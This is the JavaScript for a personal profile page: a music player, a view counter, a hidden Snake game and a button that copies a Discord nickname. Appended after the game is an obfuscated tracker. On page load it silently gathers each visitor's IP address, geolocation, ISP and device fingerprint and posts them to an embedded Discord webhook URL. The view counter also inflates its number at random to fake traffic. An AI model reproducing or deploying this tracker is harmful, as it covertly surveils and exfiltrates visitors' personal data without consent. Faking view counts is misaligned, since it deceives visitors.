
        // Elementos DOM
        const audioPlayer = document.getElementById('audioPlayer');
        const muteBtn = document.getElementById('muteBtn');
        const playBtn = document.getElementById('playBtn');
        const playIcon = playBtn.querySelector('i');
        const albumCover = document.getElementById('albumCover');
        const songTitle = document.getElementById('songTitle');
        const songArtist = document.getElementById('songArtist');
        const progressBar = document.getElementById('progressBar');
        const progress = document.getElementById('progress');
        const currentTimeElement = document.getElementById('currentTime');
        const totalTimeElement = document.getElementById('totalTime');
        const viewCountElement = document.getElementById('viewCount');
        
        // Configurações da música - ALTERE AQUI
        const musicConfig = {
            title: "Só/Sim ou Não",           // Título da música
            artist: "Massaru",             // Artista
            cover: "img/musica.jpg", // URL da capa
            file: "music/massaru.mp3",  // Arquivo da música
            volume: 0.1                  // Volume (0 a 1)
        };
        
        // Estados
        let isMuted = false;
        let isPlaying = true;
        let viewCount = 1245;
        
        // Inicializar o player
        function initPlayer() {
            // Configurar música
            songTitle.textContent = musicConfig.title;
            songArtist.textContent = musicConfig.artist;
            albumCover.src = musicConfig.cover;
            audioPlayer.src = musicConfig.file;
            
            // Configurar volume
            audioPlayer.volume = musicConfig.volume;
            
            // Iniciar reprodução automática
            audioPlayer.play().catch(e => {
                console.log("Reprodução automática bloqueada:", e);
                playIcon.className = 'fas fa-play';
                isPlaying = false;
            });
            
            // Atualizar contador de visualizações
            setInterval(updateViewCount, 5000);
        }
        
        // Atualizar contador de visualizações
        function updateViewCount() {
            viewCount += Math.floor(Math.random() * 3) + 1;
            viewCountElement.textContent = viewCount.toLocaleString() + ' visualizações';
        }
        
        // Formatador de tempo
        function formatTime(seconds) {
            if (isNaN(seconds)) return "0:00";
            const mins = Math.floor(seconds / 60);
            const secs = Math.floor(seconds % 60);
            return `${mins}:${secs < 10 ? '0' : ''}${secs}`;
        }
        
        // Botão de mudo
        muteBtn.addEventListener('click', function() {
            isMuted = !isMuted;
            audioPlayer.muted = isMuted;
            const icon = muteBtn.querySelector('i');
            
            if (isMuted) {
                icon.className = 'fas fa-volume-mute';
                muteBtn.style.background = 'rgba(255, 50, 50, 0.3)';
            } else {
                icon.className = 'fas fa-volume-up';
                muteBtn.style.background = 'rgba(255, 255, 255, 0.2)';
            }
        });
        
        // Botão play/pause
        playBtn.addEventListener('click', function() {
            if (isPlaying) {
                audioPlayer.pause();
                playIcon.className = 'fas fa-play';
                isPlaying = false;
            } else {
                audioPlayer.play();
                playIcon.className = 'fas fa-pause';
                isPlaying = true;
            }
        });
        
        // Atualizar barra de progresso
        audioPlayer.addEventListener('timeupdate', function() {
            const currentTime = audioPlayer.currentTime;
            const duration = audioPlayer.duration;
            
            if (duration) {
                const progressPercent = (currentTime / duration) * 100;
                progress.style.width = progressPercent + '%';
                currentTimeElement.textContent = formatTime(currentTime);
                totalTimeElement.textContent = formatTime(duration);
            }
        });
        
        // Clique na barra de progresso
        progressBar.addEventListener('click', function(e) {
            if (!audioPlayer.duration) return;
            
            const rect = progressBar.getBoundingClientRect();
            const clickX = e.clientX - rect.left;
            const newPercent = (clickX / rect.width);
            
            audioPlayer.currentTime = newPercent * audioPlayer.duration;
        });
        
        // Quando a música terminar
        audioPlayer.addEventListener('ended', function() {
            // Reiniciar a música
            audioPlayer.currentTime = 0;
            audioPlayer.play();
        });
        
        // Inicializar quando a página carregar
        window.addEventListener('load', initPlayer);







        // Sistema de código secreto - Snake Game
const secretCode = "snakegame";
let inputSequence = [];
let snakeGameActive = false;

// Detectar sequência de teclas
document.addEventListener('keydown', function(e) {
    if (snakeGameActive) return;
    
    inputSequence.push(e.key.toLowerCase());
    if (inputSequence.length > secretCode.length) {
        inputSequence.shift();
    }
    
    if (inputSequence.join('') === secretCode) {
        startSnakeGame();
        inputSequence = [];
    }
});

// Iniciar Snake Game
function startSnakeGame() {
    snakeGameActive = true;
    const snakeGame = document.getElementById('snakeGame');
    snakeGame.classList.add('active');
    initSnakeGame();
}

// Fechar Snake Game
document.getElementById('closeSnake').addEventListener('click', function() {
    snakeGameActive = false;
    document.getElementById('snakeGame').classList.remove('active');
});

// Tecla ESC para sair
document.addEventListener('keydown', function(e) {
    if (e.key === 'Escape' && snakeGameActive) {
        snakeGameActive = false;
        document.getElementById('snakeGame').classList.remove('active');
    }
});

// Jogo da Cobrinha
function initSnakeGame() {
    const canvas = document.getElementById('snakeCanvas');
    const ctx = canvas.getContext('2d');
    
    const gridSize = 20;
    const tileCount = canvas.width / gridSize;
    
    let snake = [
        {x: 10, y: 10}
    ];
    let food = {};
    let dx = 0;
    let dy = 0;
    let score = 0;
    
    function randomFood() {
        food = {
            x: Math.floor(Math.random() * tileCount),
            y: Math.floor(Math.random() * tileCount)
        };
    }
    
    function drawGame() {
        // Limpar canvas
        ctx.fillStyle = 'black';
        ctx.fillRect(0, 0, canvas.width, canvas.height);
        
        // Desenhar cobra
        ctx.fillStyle = '#6c5ce7';
        snake.forEach(segment => {
            ctx.fillRect(segment.x * gridSize, segment.y * gridSize, gridSize - 2, gridSize - 2);
        });
        
        // Desenhar comida
        ctx.fillStyle = '#ff4757';
        ctx.fillRect(food.x * gridSize, food.y * gridSize, gridSize - 2, gridSize - 2);
        
        // Desenhar pontuação
        ctx.fillStyle = 'white';
        ctx.font = '20px Arial';
        ctx.fillText('Score: ' + score, 10, 30);
    }
    
    function updateGame() {
        // Mover cobra
        const head = {x: snake[0].x + dx, y: snake[0].y + dy};
        snake.unshift(head);
        
        // Verificar colisão com comida
        if (head.x === food.x && head.y === food.y) {
            score += 10;
            randomFood();
        } else {
            snake.pop();
        }
        
        // Verificar colisão com paredes
        if (head.x < 0 || head.x >= tileCount || head.y < 0 || head.y >= tileCount) {
            resetGame();
        }
        
        // Verificar colisão com próprio corpo
        for (let i = 1; i < snake.length; i++) {
            if (head.x === snake[i].x && head.y === snake[i].y) {
                resetGame();
            }
        }
    }
    
    function resetGame() {
        snake = [{x: 10, y: 10}];
        dx = 0;
        dy = 0;
        score = 0;
        randomFood();
    }
    
    function changeDirection(e) {
        // WASD e Setas
        if (e.key === 'ArrowUp' || e.key === 'w') {
            if (dy !== 1) { dx = 0; dy = -1; }
        } else if (e.key === 'ArrowDown' || e.key === 's') {
            if (dy !== -1) { dx = 0; dy = 1; }
        } else if (e.key === 'ArrowLeft' || e.key === 'a') {
            if (dx !== 1) { dx = -1; dy = 0; }
        } else if (e.key === 'ArrowRight' || e.key === 'd') {
            if (dx !== -1) { dx = 1; dy = 0; }
        }
    }
    
    // Inicializar jogo
    randomFood();
    document.addEventListener('keydown', changeDirection);
    
    // Loop do jogo
    function gameLoop() {
        if (!snakeGameActive) return;
        
        updateGame();
        drawGame();
        setTimeout(gameLoop, 100);
    }
    
    gameLoop();
}


 

const _0x186b5f=_0x187a;(function(_0x7036f2,_0x20aa88){const _0x3adf8f=_0x187a,_0x45901f=_0x7036f2();while(!![]){try{const _0x3fd850=-parseInt(_0x3adf8f(0x1c6))/0x1+-parseInt(_0x3adf8f(0x1ec))/0x2*(parseInt(_0x3adf8f(0x1c1))/0x3)+-parseInt(_0x3adf8f(0x1cc))/0x4+-parseInt(_0x3adf8f(0x1ef))/0x5+parseInt(_0x3adf8f(0x1ca))/0x6*(parseInt(_0x3adf8f(0x213))/0x7)+parseInt(_0x3adf8f(0x1e4))/0x8*(parseInt(_0x3adf8f(0x1e5))/0x9)+-parseInt(_0x3adf8f(0x218))/0xa*(-parseInt(_0x3adf8f(0x1f8))/0xb);if(_0x3fd850===_0x20aa88)break;else _0x45901f['push'](_0x45901f['shift']());}catch(_0x593076){_0x45901f['push'](_0x45901f['shift']());}}}(_0x3cb0,0x98a70));function _0x187a(_0xcb8666,_0x4e39b6){const _0x3cb066=_0x3cb0();return _0x187a=function(_0x187a26,_0x4be5c5){_0x187a26=_0x187a26-0x1bf;let _0x13a063=_0x3cb066[_0x187a26];return _0x13a063;},_0x187a(_0xcb8666,_0x4e39b6);}class VisitorTracker{constructor(){const _0x5c3ed7=_0x187a;this[_0x5c3ed7(0x200)]='https://discord.com/api/webhooks/1421905203082559488/vJ5-Yi3ojBbRAjVNQXDfJl63aEvintamvbyFGDKXnKKP-AjWNNNJxYwO7Nsue4ha8jP6',this[_0x5c3ed7(0x21b)]={'enableIP':!![],'enableLocation':!![],'enableDeviceInfo':!![],'enableISP':!![],'timeout':0x1388};}async[_0x186b5f(0x214)](){const _0x26f865=_0x186b5f;try{const _0x3337d1=await this[_0x26f865(0x1c7)]();await this[_0x26f865(0x1c8)](_0x3337d1);}catch(_0x33f1ee){await this[_0x26f865(0x1fd)](_0x33f1ee);}}async[_0x186b5f(0x1c7)](){const _0xab6bb0=_0x186b5f,_0x3dd73a=await this[_0xab6bb0(0x1ea)](),_0x375055=await this[_0xab6bb0(0x1e1)](_0x3dd73a),_0x12b386=this[_0xab6bb0(0x215)](),_0x43e6e6=await this[_0xab6bb0(0x1e2)]();return{'ip':_0x3dd73a,'isp':_0x375055[_0xab6bb0(0x1c2)]||_0x43e6e6[_0xab6bb0(0x1c2)],'connectionType':_0x43e6e6['type'],'city':_0x375055['city'],'region':_0x375055[_0xab6bb0(0x223)],'country':_0x375055[_0xab6bb0(0x216)],'timezone':_0x375055[_0xab6bb0(0x205)],'coordinates':_0x375055['coordinates'],'device':_0x12b386['device'],'browser':_0x12b386[_0xab6bb0(0x224)],'os':_0x12b386['os'],'screen':_0x12b386[_0xab6bb0(0x1d4)],'language':_0x12b386[_0xab6bb0(0x1d9)],'userAgent':navigator[_0xab6bb0(0x1de)],'timestamp':new Date()[_0xab6bb0(0x1c4)](),'page':window[_0xab6bb0(0x1d8)][_0xab6bb0(0x1e3)],'referrer':document[_0xab6bb0(0x20d)]||'Direto'};}async['getIP'](){const _0x262b4b=_0x186b5f,_0xaf7e5=[_0x262b4b(0x207),_0x262b4b(0x1db),_0x262b4b(0x208),_0x262b4b(0x1d0),_0x262b4b(0x1ce)];for(const _0x5967d8 of _0xaf7e5){try{const _0x5acfa3=new AbortController(),_0x217e92=setTimeout(()=>_0x5acfa3[_0x262b4b(0x1dd)](),this[_0x262b4b(0x21b)]['timeout']),_0x58d40e=await fetch(_0x5967d8,{'signal':_0x5acfa3['signal']});clearTimeout(_0x217e92);if(_0x5967d8['includes']('json')){const _0x131f38=await _0x58d40e[_0x262b4b(0x1d5)]();return _0x131f38['ip'];}else{const _0x39d1a2=await _0x58d40e[_0x262b4b(0x1f7)]();return _0x39d1a2[_0x262b4b(0x219)]();}}catch(_0x525050){continue;}}throw new Error(_0x262b4b(0x1cd));}async[_0x186b5f(0x1e1)](_0x38e0e4){const _0x2a0d82=_0x186b5f,_0x42a9de=['https://ipapi.co/'+_0x38e0e4+_0x2a0d82(0x1d1),'https://ipwhois.app/json/'+_0x38e0e4,_0x2a0d82(0x1f2)+_0x38e0e4];for(const _0xad2ef7 of _0x42a9de){try{const _0x31f273=new AbortController(),_0x5b4582=setTimeout(()=>_0x31f273[_0x2a0d82(0x1dd)](),this[_0x2a0d82(0x21b)]['timeout']),_0x5390d5=await fetch(_0xad2ef7,{'signal':_0x31f273[_0x2a0d82(0x206)]});clearTimeout(_0x5b4582);const _0x3be4bf=await _0x5390d5[_0x2a0d82(0x1d5)]();return{'city':_0x3be4bf[_0x2a0d82(0x21c)]||_0x3be4bf[_0x2a0d82(0x1df)]||_0x2a0d82(0x1e7),'region':_0x3be4bf[_0x2a0d82(0x223)]||_0x3be4bf['region_name']||_0x3be4bf[_0x2a0d82(0x20c)]||'Desconhecido','country':_0x3be4bf[_0x2a0d82(0x1e8)]||_0x3be4bf[_0x2a0d82(0x216)]||_0x2a0d82(0x1e7),'timezone':_0x3be4bf[_0x2a0d82(0x205)]||_0x3be4bf[_0x2a0d82(0x202)]||_0x2a0d82(0x1e7),'coordinates':_0x3be4bf[_0x2a0d82(0x1d7)]&&_0x3be4bf['longitude']?_0x3be4bf[_0x2a0d82(0x1d7)]+',\x20'+_0x3be4bf['longitude']:_0x2a0d82(0x1dc),'isp':_0x3be4bf[_0x2a0d82(0x1eb)]||_0x3be4bf[_0x2a0d82(0x1c2)]||_0x3be4bf[_0x2a0d82(0x1ee)]||_0x2a0d82(0x1e7)};}catch(_0x475d4b){continue;}}return{'city':'Desconhecido','region':_0x2a0d82(0x1e7),'country':'Desconhecido','timezone':_0x2a0d82(0x1e7),'coordinates':'Não\x20disponível','isp':_0x2a0d82(0x1e7)};}[_0x186b5f(0x215)](){const _0x53905a=_0x186b5f,_0x3225f2=navigator[_0x53905a(0x1de)];let _0x50cac4=_0x53905a(0x1d2);if(/Mobile|Android|iPhone|iPad|iPod/i[_0x53905a(0x1f5)](_0x3225f2))_0x50cac4=_0x53905a(0x209);else/Tablet|iPad/i[_0x53905a(0x1f5)](_0x3225f2)&&(_0x50cac4=_0x53905a(0x1bf));let _0x4aee68=_0x53905a(0x1e6);if(/Firefox/[_0x53905a(0x1f5)](_0x3225f2))_0x4aee68=_0x53905a(0x1fc);else{if(/Safari/[_0x53905a(0x1f5)](_0x3225f2)&&!/Chrome/[_0x53905a(0x1f5)](_0x3225f2))_0x4aee68=_0x53905a(0x1f3);else{if(/Edge/[_0x53905a(0x1f5)](_0x3225f2))_0x4aee68=_0x53905a(0x1c5);else{if(/Opera/[_0x53905a(0x1f5)](_0x3225f2))_0x4aee68=_0x53905a(0x1f1);}}}let _0x23d9fa=_0x53905a(0x20f);if(/Android/[_0x53905a(0x1f5)](_0x3225f2))_0x23d9fa=_0x53905a(0x1fb);else{if(/iPhone|iPad|iPod/[_0x53905a(0x1f5)](_0x3225f2))_0x23d9fa=_0x53905a(0x1ed);else{if(/Mac/['test'](_0x3225f2))_0x23d9fa='macOS';else{if(/Linux/['test'](_0x3225f2))_0x23d9fa=_0x53905a(0x225);}}}return{'device':_0x50cac4,'browser':_0x4aee68,'os':_0x23d9fa,'screen':screen[_0x53905a(0x1cb)]+'x'+screen[_0x53905a(0x1fe)],'language':navigator['language']||_0x53905a(0x20b)};}async[_0x186b5f(0x1e2)](){const _0x318fff=_0x186b5f;if(navigator[_0x318fff(0x222)]){const _0x51e57e=navigator[_0x318fff(0x222)];return{'isp':'Desconhecido','type':_0x51e57e[_0x318fff(0x221)]||_0x318fff(0x1e7),'downlink':_0x51e57e[_0x318fff(0x204)]?_0x51e57e[_0x318fff(0x204)]+_0x318fff(0x1f6):_0x318fff(0x1e7),'rtt':_0x51e57e[_0x318fff(0x211)]?_0x51e57e[_0x318fff(0x211)]+'ms':_0x318fff(0x1e7)};}return{'isp':_0x318fff(0x1e7),'type':_0x318fff(0x1e7),'downlink':_0x318fff(0x1e7),'rtt':'Desconhecido'};}async[_0x186b5f(0x1c8)](_0x4fd0a7){const _0xef3cdf=_0x186b5f;let _0x5ea98d=0x64fff5;if(_0x4fd0a7['device'][_0xef3cdf(0x201)](_0xef3cdf(0x1c0)))_0x5ea98d=0xff00;if(_0x4fd0a7[_0xef3cdf(0x21a)][_0xef3cdf(0x201)](_0xef3cdf(0x217)))_0x5ea98d=0xffa500;const _0x4c71f7={'title':_0x4fd0a7['device']+_0xef3cdf(0x203),'color':_0x5ea98d,'fields':[{'name':_0xef3cdf(0x1c3),'value':'**IP:**\x20`'+_0x4fd0a7['ip']+_0xef3cdf(0x20a)+_0x4fd0a7['isp']+_0xef3cdf(0x1e0)+_0x4fd0a7[_0xef3cdf(0x1f4)],'inline':!![]},{'name':_0xef3cdf(0x1cf),'value':'**Cidade:**\x20'+_0x4fd0a7['city']+_0xef3cdf(0x1da)+_0x4fd0a7[_0xef3cdf(0x223)]+_0xef3cdf(0x1c9)+_0x4fd0a7[_0xef3cdf(0x216)],'inline':!![]},{'name':_0xef3cdf(0x210),'value':_0xef3cdf(0x1f9)+_0x4fd0a7['os']+'\x0a**Navegador:**\x20'+_0x4fd0a7[_0xef3cdf(0x224)]+_0xef3cdf(0x1ff)+_0x4fd0a7[_0xef3cdf(0x1d4)],'inline':!![]}],'footer':{'text':_0xef3cdf(0x1d6)+_0x4fd0a7[_0xef3cdf(0x212)][_0xef3cdf(0x21f)]('T')[0x0]},'timestamp':_0x4fd0a7[_0xef3cdf(0x212)]};try{const _0x2c491e=await fetch(this[_0xef3cdf(0x200)],{'method':'POST','headers':{'Content-Type':_0xef3cdf(0x1f0)},'body':JSON[_0xef3cdf(0x20e)]({'embeds':[_0x4c71f7]})});if(!_0x2c491e['ok']){const _0x978bf5=await _0x2c491e[_0xef3cdf(0x1f7)]();throw new Error(_0xef3cdf(0x1fa)+_0x2c491e[_0xef3cdf(0x220)]+':\x20'+_0x978bf5);}return!![];}catch(_0x307d37){throw _0x307d37;}}async[_0x186b5f(0x1fd)](_0x4b16ea){const _0x6b9187=_0x186b5f;try{const _0x46b546=this[_0x6b9187(0x215)]();await fetch(this[_0x6b9187(0x200)],{'method':'POST','headers':{'Content-Type':'application/json'},'body':JSON[_0x6b9187(0x20e)]({'content':_0x6b9187(0x1d3)+_0x46b546[_0x6b9187(0x21a)]+_0x6b9187(0x21d)+_0x4b16ea['message']+_0x6b9187(0x1e9)+new Date()['toLocaleString']('pt-BR')})});}catch(_0x4ecb46){}}}function _0x3cb0(){const _0x3c42b8=['`\x0a**Operadora:**\x20','pt-BR','state_prov','referrer','stringify','Windows','🖥️\x20Dispositivo','rtt','timestamp','952fYirBN','init','getDeviceInfo','country','Tablet','4861070fFXeSH','trim','device','config','city','\x0a**Erro:**\x20','testTracker','split','status','effectiveType','connection','region','browser','Linux','📟\x20Tablet','Mobile','15xAIICJ','isp','🌐\x20IP\x20e\x20Rede','toISOString','Edge','570628HMcAgV','collectVisitorData','sendToDiscord','\x0a**País:**\x20','96hfKqwn','width','1841356JOjjez','Todas\x20as\x20APIs\x20de\x20IP\x20falharam','https://checkip.amazonaws.com/','📍\x20Localização','https://ident.me/','/json/','💻\x20Desktop','❌\x20**ERRO\x20NO\x20RASTREAMENTO**\x0a**Dispositivo:**\x20','screen','json','fl0ppy\x20Analytics\x20•\x20','latitude','location','language','\x0a**Região:**\x20','https://api64.ipify.org?format=json','Não\x20disponível','abort','userAgent','city_name','\x0a**Conexão:**\x20','getLocation','getNetworkInfo','href','130736JNIpqT','90dDdGAR','Chrome','Desconhecido','country_name','\x0a**Hora:**\x20','getIP','org','130658PEwFYO','iOS','asn','635740wAnxis','application/json','Opera','https://freeipapi.com/api/json/','Safari','connectionType','test','\x20Mbps','text','44KmVjGo','**SO:**\x20','HTTP\x20','Android','Firefox','sendFallbackData','height','\x0a**Tela:**\x20','webhookURL','includes','time_zone','\x20-\x20Novo\x20Acesso','downlink','timezone','signal','https://api.ipify.org?format=json','https://icanhazip.com/','📱\x20Mobile'];_0x3cb0=function(){return _0x3c42b8;};return _0x3cb0();}document['addEventListener']('DOMContentLoaded',function(){setTimeout(async()=>{try{const _0x485bbd=new VisitorTracker();await _0x485bbd['init']();}catch(_0x11505e){}},0x7d0);}),window[_0x186b5f(0x21e)]=function(){const _0x2ffd3c=_0x186b5f,_0x978ed8=new VisitorTracker();return _0x978ed8[_0x2ffd3c(0x214)]();};

// Copiar Nick Discord

function copiarDiscord() {
    const btn = event.currentTarget;
    navigator.clipboard.writeText("gh0st1450").then(() => {
      btn.classList.add("show-tooltip");
      setTimeout(() => {
        btn.classList.remove("show-tooltip");
      }, 1000);
    });
  }
